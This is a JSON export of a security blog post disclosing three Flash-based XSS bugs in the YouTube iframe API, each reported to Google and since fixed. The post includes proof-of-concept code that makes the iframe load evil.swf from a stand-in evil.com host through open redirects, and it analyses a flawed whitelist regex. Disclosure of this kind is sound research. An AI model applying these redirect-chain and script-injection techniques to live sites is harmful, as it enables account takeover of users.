{"id":188,"date":"2017-09-13T13:51:02","date_gmt":"2017-09-13T13:51:02","guid":{"rendered":"https:\/\/opnsec.com\/?p=188"},"modified":"2021-07-30T20:07:09","modified_gmt":"2021-07-30T20:07:09","slug":"advanced-flash-vulnerabilities-in-youtube-part-4","status":"publish","type":"post","link":"https:\/\/opnsec.com\/2017\/09\/advanced-flash-vulnerabilities-in-youtube-part-4\/","title":{"rendered":"Advanced Flash vulnerabilities in Youtube &#8211; Part 4"},"content":{"rendered":"<h3>IV. Flash based XSSes on Youtube iframe api<\/h3>\n<p><img loading=\"lazy\" class=\"alignnone size-medium wp-image-203\" style=\"display: none;\" src=\"http:\/\/opnsec.com\/wp-content\/uploads\/2017\/09\/Youtube-iframe-Api.png\" alt=\"\" width=\"1\" height=\"1\" srcset=\"https:\/\/opnsec.com\/wp-content\/uploads\/2017\/09\/Youtube-iframe-Api.png 1133w, https:\/\/opnsec.com\/wp-content\/uploads\/2017\/09\/Youtube-iframe-Api-150x150.png 150w, https:\/\/opnsec.com\/wp-content\/uploads\/2017\/09\/Youtube-iframe-Api-300x146.png 300w, https:\/\/opnsec.com\/wp-content\/uploads\/2017\/09\/Youtube-iframe-Api-768x375.png 768w, https:\/\/opnsec.com\/wp-content\/uploads\/2017\/09\/Youtube-iframe-Api-1024x500.png 1024w, https:\/\/opnsec.com\/wp-content\/uploads\/2017\/09\/Youtube-iframe-Api-640x360.png 640w\" sizes=\"(max-width: 1px) 100vw, 1px\" \/>I&#8217;m happy that people found my <a href=\"https:\/\/opnsec.com\/2017\/08\/advanced-flash-vulnerabilities-in-youtube\/\">previous posts on Youtube Flash vulnerabilities<\/a> interesting, and I will keep posting new write-ups.<br \/>\nThis time I will disclose 3 Flash based XSSes on the new Youtube html5 api (with Flash fallback).<\/p>\n<p>Youtube html5 api is called <a href=\"https:\/\/developers.google.com\/youtube\/iframe_api_reference\" target=\"_blank\" rel=\"noopener noreferrer\">Youtube iframe api<\/a>, because the entry point is an iframe located at youtube.com\/embed\/[VIDEO_ID].<br \/>\nWhen the iframe loads, it will first check if the browser is able to play videos using html5, and if not it will use the Flash fallback. Until recently, it was possible to force the Flash fallback for all browsers using the URL parameter nohtml5=1. This is what we will do here.<\/p>\n<p>Here is the workflow of the Youtube iframe api with Flash fallback:<\/p>\n<p><a href=\"http:\/\/opnsec.com\/wp-content\/uploads\/2017\/09\/Diagramme8.svg\"><img loading=\"lazy\" class=\"wp-image-189 aligncenter\" src=\"http:\/\/opnsec.com\/wp-content\/uploads\/2017\/09\/Diagramme8.svg\" alt=\"\" width=\"675\" height=\"449\" \/><\/a><\/p>\n<p>If you compare with the workflow of the Youtube Flash api in <a href=\"https:\/\/opnsec.com\/2017\/08\/advanced-flash-vulnerabilities-in-youtube\/\" target=\"_blank\" rel=\"noopener noreferrer\">part 1<\/a>, the Flash file &#8220;Youtube Wrapper&#8221; has been replaced by the iframe &#8220;Youtube Embed&#8221;, and consequently Flash to javascript api has been replaced by postMessage api and sharedEvent api has been replaced by Flash to javascript api. This should give you a sense of how Flash and javascript are very similar, only the implementation is different.<\/p>\n<blockquote><p>Youtube Flash api and Youtube iframe api are so similar that <a href=\"https:\/\/bugzilla.mozilla.org\/show_bug.cgi?format=default&amp;id=769117\" target=\"_blank\" rel=\"noopener noreferrer\">Firefox <\/a>, <a href=\"https:\/\/groups.google.com\/a\/chromium.org\/forum\/#!msg\/chromium-dev\/BW8g1iB0jLs\/uddWuBroBAAJ\" target=\"_blank\" rel=\"noopener noreferrer\">Chrome <\/a>and <a href=\"https:\/\/github.com\/WebKit\/webkit\/blob\/master\/Source\/WebCore\/Modules\/plugins\/YouTubePluginReplacement.cpp\" target=\"_blank\" rel=\"noopener noreferrer\">Safari <\/a>have implemented an interesting\/weird <a href=\"https:\/\/github.com\/whatwg\/html\/issues\/2390\" target=\"_blank\" rel=\"noopener noreferrer\">behaviour <\/a>where any &lt;object data=&#8221;youtube.com\/v\/[VIDEO_ID]&#8221;&gt; (Youtube Flash api) will be automatically replaced by &lt;object data=&#8221;youtube.com\/embed\/[VIDEO_ID]&#8221;&gt;(Youtube iframe api) where the &lt;object&gt; will actually behave as an iframe. The objective is to force old websites to switch to Youtube iframe api without making any change in the websites themselves.<\/p><\/blockquote>\n<p>To trigger a Flash based XSS on youtube.com, you have to either load a Flash file located at youtube.com directly from the address bar, or exploit any Flash file embed in a html page located at youtube.com. Here we will exploit the Flash file &#8220;Main App&#8221; which is embed in youtube.com\/embed, and from there we will execute arbitrary javascript on youtube.com\/embed.<br \/>\nWhen an external website embeds a Youtube iframe, it can send <a href=\"https:\/\/developers.google.com\/youtube\/iframe_api_reference#Functions\" target=\"_blank\" rel=\"noopener noreferrer\">commands <\/a>to the Youtube iframe using the postMessage api such as playVideo(), pauseVideo(), etc&#8230; The Youtube iframe will then transmit the command to the Flash Main App (using the Flash to javascript api).<\/p>\n<p>&nbsp;<\/p>\n<h3>1. Flash based XSS using loadPlaylist command<\/h3>\n<p>One particular command is <a href=\"https:\/\/developers.google.com\/youtube\/iframe_api_reference#loadPlaylist\" target=\"_blank\" rel=\"noopener noreferrer\">loadPlaylist()<\/a> which will make the Youtube iframe load a playlist. The argument of loadPlaylist() can either be a Youtube playlist ID or an array of Youtube video IDs. When using an array of Youtube video IDs, it is possible to inject arbitrary poster (thumbnail) image url for each video.<br \/>\nLoading an image in Flash is similar to loading an external Flash file using Loader.load(), so we could load an arbitrary Flash file using this. Main App checks if the url of the poster image is a youtube.com url and then loads the image. Now you might be aware that Google doesn&#8217;t believe that open redirections are security issues! This makes url sanitization very difficult, because you just need to provide a youtube.com url that will redirect to an arbitrary location. I didn&#8217;t find an open redirector directly on youtube.com. However, I found a youtube.com url that will redirect to any google.com url. From there it was easy to find an open redirector on google.com that would redirect to evil.com. The full url payload was <pre><code >https:\/\/accounts.youtube.com\/accounts\/SetSID?continue=https:\/\/www.google.com\/amp\/s\/evil.com\/evil.swf<\/code><\/pre><br \/>\nOnce evil.swf is loaded on youtube.com\/embed it can execute arbitrary javascript using the Flash to javascript api, which means XSS on youtube.com!<\/p>\n<blockquote><p>Note: By default only Flash file located on the same domain than the html host page can use the Flash to javascript api. But in youtube.com\/embed\/[VIDEO_ID] the Main App &lt;object&gt; tag contains the attribute &#8220;<a href=\"https:\/\/helpx.adobe.com\/flash\/kb\/control-access-scripts-host-web.html\" target=\"_blank\" rel=\"noopener noreferrer\">allowscriptaccess=always<\/a>&#8221; which means that any Flash file loaded by the Main App will be able to use the Flash to javascript api on youtube.com\/embed\/[VIDEO_ID]<\/p><\/blockquote>\n<p>Here is the workflow of the POC:<\/p>\n<p><a href=\"http:\/\/opnsec.com\/wp-content\/uploads\/2017\/09\/Diagramme9.svg\"><img loading=\"lazy\" class=\"wp-image-190 aligncenter\" src=\"http:\/\/opnsec.com\/wp-content\/uploads\/2017\/09\/Diagramme9.svg\" alt=\"\" width=\"864\" height=\"350\" \/><\/a><\/p>\n<p>evil.com\/evil.html source code:<\/p>\n<pre><code >&lt;!DOCTYPE html&gt;<br \/>\n&lt;html&gt;<br \/>\n&lt;body&gt;<br \/>\n&lt;!-- Youtube iframe api with forced Flash fallback --&gt;<br \/>\n&lt;iframe id=\"player\" src=\"https:\/\/www.youtube.com\/embed\/?nohtml5=1\"&gt;&lt;\/iframe&gt;<br \/>\n&lt;script&gt;<br \/>\n\/\/ Wait 5 seconds to let the Youtube iframe fully load<br \/>\nsetTimeout(<br \/>\nfunction(){<br \/>\n\/\/ Send the loadPlaylist command to the Youtube iframe using postMessage api, with the image payload<br \/>\ndocument.getElementById(\"player\").contentWindow.postMessage('{\"command\":\"loadPlaylist\",\"data\":[{\"video_id\":\"xyz\",\"iurl\":\"https:\/\/accounts.youtube.com\/accounts\/SetSID?continue=https%3A%2F%2Fwww.google.com%2Famp%2Fs%2Fevil.com%2Fevil.swf\"}]}', \"*\");<br \/>\n}<br \/>\n, 5000);<br \/>\n&lt;\/script&gt;<br \/>\n&lt;\/body&gt;<br \/>\n&lt;\/html&gt;<\/code><\/pre>\n<p>evil.swf source code:<\/p>\n<pre><code >public class Main extends Sprite {<br \/>\npublic function Main(){<br \/>\n\/\/ Execute arbitrary javascript on youtube.com\/embed using ExternalInterface (Flash to javascript api)<br \/>\nExternalInterface.call(\"alert\", \"document.domain + ' XSSed!'\");<br \/>\n}<br \/>\n}<\/code><\/pre>\n<p>Attack Scenario:<br \/>\nPrerequisite: The victim has Flash Player enabled<br \/>\n1. The victim visits evil.com\/evil.html<br \/>\n2. evil.html loads youtube.com\/embed iframe<br \/>\n3. evil.html sends the loadPlaylist payload<br \/>\n4. youtube.com\/embed loads evil.swf<br \/>\n5. evil.swf execute XSS on youtube.com\/embed<\/p>\n<p>Mitigation:<br \/>\nGoogle patched the Main App so that it doesn&#8217;t take picture url into account in loadPlaylist arguments.<\/p>\n<p>Timeline:<br \/>\n10\/05\/2016 Reported to Google<br \/>\n10\/11\/2016 &#8220;Nice catch&#8221; and reward<img loading=\"lazy\" class=\"alignnone wp-image-141\" src=\"http:\/\/opnsec.com\/wp-content\/uploads\/2017\/08\/2-stars.png\" alt=\"\" width=\"56\" height=\"13\" \/><br \/>\n11\/09\/2016 Bug fixed and verified<\/p>\n<p>&nbsp;<\/p>\n<h3>2. Flash based XSS using trustedLoader Regex<\/h3>\n<p>In addition to public commands like playVideo() or loadPlaylist(), Youtube api has private commands that are available only if the webpage that loads the Youtube iframe is from a verified, trusted origin (like youtube.com or drive.google.com\/xxx). To do this, the Main App uses a whitelist stored in a regex. The regex is like this :<br \/>\n<pre><code >public static const trustedLoader:RegExp = new RegExp(\"^https?:\/\/((www\\.|encrypted\\.)?google(\\.com|\\.co)?\\.[a-z]{2,3}\/(search|webhp)\\?|24e12c4a-a-95274a9c-s-sites.googlegroups.com\/a\/google.com\/flash-api-test-harness\/apiharness.swf|www\\.gstatic\\.com\/doubleclick\/studio\/innovation\/h5\/layouts\/tetris|tpc\\.googlesyndication\\.com\/safeframe\/|lightbox-(demos|builder)\\.appspot\\.com\/|([A-Za-z0-9-]{1,63}\\.)*(imasdk\\.googleapis\\.com|corp\\.google\\.com|borg\\.google\\.com|docs\\.google\\.com|drive\\.google\\.com|googleads\\.g\\.doubleclick\\.net|googleplex\\.com|play\\.google\\.com|prod\\.google\\.com|sandbox\\.google\\.com|photos\\.google\\.com|picasaweb\\.google\\.com|lh2\\.google\\.com|plus\\.google\\.com|books\\.googleusercontent\\.com|mail\\.google\\.com|talkgadget\\.google\\.com|survey\\.g\\.doubleclick\\.net|youtube\\.com|youtube\\.googleapis\\.com|youtube-nocookie\\.com|youtubeeducation\\.com|vevo\\.com)(:[0-9]+)?([\\\/\\?\\#]|$))\");<\/code><\/pre><\/p>\n<blockquote><p>Before reading more, you should check the regex yourself and try to find the mistake in it!<\/p>\n<p>&nbsp;<\/p><\/blockquote>\n<p>&#8220;.&#8221; (dot) is a wildcard in Regex, which means it will match any character. If you only want to match a literal dot, you have to escape it like this &#8220;\\.&#8221;<br \/>\nIn trustedLoader RegExp, we have this code : <pre><code >24e12c4a-a-95274a9c-s-sites.googlegroups.com\/a\/google.com\/flash-api-test-harness\/apiharness.swf<\/code><\/pre><br \/>\nwhere the dots are not escaped. This means that we can replace the dots by any character and it will still match the Regex.<br \/>\nin particular, http:\/\/24e12c4a-a-95274a9c-s-sites<strong>A<\/strong>googlegroups.com\/a\/google.com\/flash-api-test-harness\/apiharness.swf will match the regex, and this domain is not owned by Google. It was available so I bought it for 1$! (You could use any alphanumeric character instead of A)<br \/>\nI hosted a html page at http:\/\/24e12c4a-a-95274a9c-s-sites<strong>A<\/strong>googlegroups.com\/a\/google.com\/flash-api-test-harness\/apiharness.swf that will load a Youtube iframe and I have access to the private commands of the Youtube api.<\/p>\n<p>Among the private commands there is a function updateVideoData(), that allows you to inject an arbitrary Flash file as a poster image exactly like with loadPlaylist() before. I won&#8217;t go into details as the rest of the report is similar to previous one.<\/p>\n<p>Mitigation:<br \/>\nGoogle patched trustedLoader Regex to properly escape dots like this 24e12c4a-a-95274a9c-s-sites\\.googlegroups\\.com\/a\/google\\.com\/flash-api-test-harness\/apiharness\\.swf<\/p>\n<p>Timeline:<br \/>\n11\/22\/2016 Report to Google<br \/>\n11\/29\/2016 Reward<img loading=\"lazy\" class=\"alignnone wp-image-141\" src=\"http:\/\/opnsec.com\/wp-content\/uploads\/2017\/08\/2-stars.png\" alt=\"\" width=\"56\" height=\"13\" \/><br \/>\n01\/18\/2017 Issue fixed and verified<\/p>\n<p>&nbsp;<\/p>\n<h3>3. Flash based XSS using trustedLoader regex&#8230; again!<\/h3>\n<p>Let&#8217;s have a look at the trustedLoader regex again. There are still problems with it! For example <pre><code >google(\\.com|\\.co)?\\.[a-z]{2,3}<\/code><\/pre> is not a secure way to check that a domain is a Google owned domain because <pre><code >google.com.fun<\/code><\/pre> for example will match the regex but is not a Google owned domain.<br \/>\nLet&#8217;s take another example: <pre><code >www\\.gstatic\\.com\/doubleclick\/studio\/innovation\/h5\/layouts\/tetris<\/code><\/pre> is consider a trusted url. But there are XSSes in other www.gstatic.com webpages, and from there we can execute arbitrary javascript on www.gstatic.com\/doubleclick\/studio\/innovation\/h5\/layouts\/tetris and then load a Youtube iframe, send a updateVideoData() command and execute XSS on youtube.com\/embed.<\/p>\n<p>Let&#8217;s make a drawing of the attack workflow:<\/p>\n<p><a href=\"http:\/\/opnsec.com\/wp-content\/uploads\/2017\/09\/Diagramme10.svg\"><img loading=\"lazy\" class=\"wp-image-191 aligncenter\" src=\"http:\/\/opnsec.com\/wp-content\/uploads\/2017\/09\/Diagramme10.svg\" alt=\"\" width=\"923\" height=\"406\" \/><\/a><\/p>\n<p>Technical details:<br \/>\nPrerequisite: The victim has Flash Player and opens www.gstatic.com\/charts\/motionchart\/0\/en_GB\/tlz-gviz.swf?chartId=[arbitrary javascript]<br \/>\n1. The arbitrary javascript makes www.gstatic.com\/charts\/motionchart\/0\/en_GB\/tlz-gviz.swf load an iframe at https:\/\/www.gstatic.com\/doubleclick\/studio\/innovation\/h5\/layouts\/tetris<br \/>\n2-3-4. The arbitrary javascript makes https:\/\/www.gstatic.com\/doubleclick\/studio\/innovation\/h5\/layouts\/tetris load an iframe at youtube.com\/embed<br \/>\n5. The arbitrary javascript sends a updateVideoData() command to Youtube iframe<br \/>\n6. Youtube iframe accepts the command because https:\/\/www.gstatic.com\/doubleclick\/studio\/innovation\/h5\/layouts\/tetris is a trusted loader, and transmits it to Main App<br \/>\n7. Main App loads arbitrary Flash file (the open redirection was different this time because previous one was fixed)<br \/>\n8. Evil Flash file executes XSS on youtube.com\/embed<\/p>\n<p>&nbsp;<\/p>\n<p>Mitigation:<br \/>\nYoutube removed the option nohtml5=1 to force the Flash fallback. There are still similar vulnerabilities but they are now limited to browsers that can&#8217;t play video using html5. This is typically very old browsers that are out of scope for Bug Bounty programs.<\/p>\n<p>Timeline:<br \/>\n02\/02\/2017 Report to Google<br \/>\n02\/02\/2017 &#8220;Nice catch&#8221; from Eduardo, who also advised me to apply to <a href=\"https:\/\/www.google.com\/about\/appsecurity\/research-grants\/\" target=\"_blank\" rel=\"noopener noreferrer\">Google Research Grants <\/a>program<br \/>\n02\/14\/2017 Reward <img loading=\"lazy\" class=\"alignnone size-full wp-image-70\" src=\"http:\/\/opnsec.com\/wp-content\/uploads\/2017\/08\/3-stars.png\" alt=\"\" width=\"60\" height=\"14\" \/><br \/>\n04\/11\/2017 Issue fixed and verified<\/p>\n<p>Conclusion:<br \/>\nYou can see that Flash and javascript are very similar and can be used together or you can replace one by the other. The same is true for Flash security and javascript security, this is why I think it is useful to learn about Flash implementation vulnerabilities in order to build more secure javascript applications (especially when there is a Flash fallback). You can also see that Flash based XSS are very similar to DOM XSSes is the sense that they only reveal during code execution and cannot be caught by Web Application Firewalls, browser based mitigation like XSS auditor or even vulnerability scanners.<\/p>\n<p>Thank you very much for reading, and I also want to thank Google VRP team because you are really doing an amazing work!<\/p>\n<p>In the future I will disclose more mixed javascript\/Flash bugs from Youtube, Facebook, WordPress and others, and slowly we will get rid of Flash and I will disclose pure javascript vulnerabilities on those domains.<\/p>\n\n<div class=\"twitter-share\"><a href=\"https:\/\/twitter.com\/intent\/tweet?text=Flash%20based%20%23XSS-es%20on%20Youtube%20iframe%20api%20%28Flash%20vulnerabilities%20in%20Youtube%20Part%204%29&#038;via=opnsec\" class=\"twitter-share-button\">Tweet<\/a><\/div>\n","protected":false},"excerpt":{"rendered":"<p>IV. Flash based XSSes on Youtube iframe api I&#8217;m happy that people found my previous posts on Youtube Flash vulnerabilities interesting, and I will keep posting new write-ups. This time I will disclose 3 Flash based XSSes on the new Youtube html5 api (with Flash fallback). Youtube html5 api is called Youtube iframe api, because&hellip; <a class=\"read-more\" href=\"https:\/\/opnsec.com\/2017\/09\/advanced-flash-vulnerabilities-in-youtube-part-4\/\">Read More<\/a><\/p>\n","protected":false},"author":2,"featured_media":0,"comment_status":"closed","ping_status":"open","sticky":false,"template":"","format":"standard","meta":{"spay_email":""},"categories":[2],"tags":[3,5,6,4],"jetpack_featured_media_url":"","_links":{"self":[{"href":"https:\/\/opnsec.com\/wp-json\/wp\/v2\/posts\/188"}],"collection":[{"href":"https:\/\/opnsec.com\/wp-json\/wp\/v2\/posts"}],"about":[{"href":"https:\/\/opnsec.com\/wp-json\/wp\/v2\/types\/post"}],"author":[{"embeddable":true,"href":"https:\/\/opnsec.com\/wp-json\/wp\/v2\/users\/2"}],"replies":[{"embeddable":true,"href":"https:\/\/opnsec.com\/wp-json\/wp\/v2\/comments?post=188"}],"version-history":[{"count":11,"href":"https:\/\/opnsec.com\/wp-json\/wp\/v2\/posts\/188\/revisions"}],"predecessor-version":[{"id":375,"href":"https:\/\/opnsec.com\/wp-json\/wp\/v2\/posts\/188\/revisions\/375"}],"wp:attachment":[{"href":"https:\/\/opnsec.com\/wp-json\/wp\/v2\/media?parent=188"}],"wp:term":[{"taxonomy":"category","embeddable":true,"href":"https:\/\/opnsec.com\/wp-json\/wp\/v2\/categories?post=188"},{"taxonomy":"post_tag","embeddable":true,"href":"https:\/\/opnsec.com\/wp-json\/wp\/v2\/tags?post=188"}],"curies":[{"name":"wp","href":"https:\/\/api.w.org\/{rel}","templated":true}]}}